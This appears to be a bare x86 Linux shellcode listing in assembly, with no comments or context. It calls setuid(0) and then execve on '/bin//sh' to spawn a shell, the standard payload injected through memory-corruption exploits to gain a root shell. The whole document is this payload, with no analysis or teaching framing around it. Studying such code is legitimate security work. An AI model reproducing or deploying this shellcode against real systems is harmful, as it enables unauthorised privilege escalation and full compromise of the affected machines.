section .text
	global _start
_start:
	xor ebx,ebx
	mov al,0x17
	int 0x80
	xor eax,eax
	push eax
	push 0x68732f2f
	push 0x6e69622f
	mov ebx,esp
	push eax
	push ebx
	mov ecx,eax
	mov al,0xb
	int 0x80
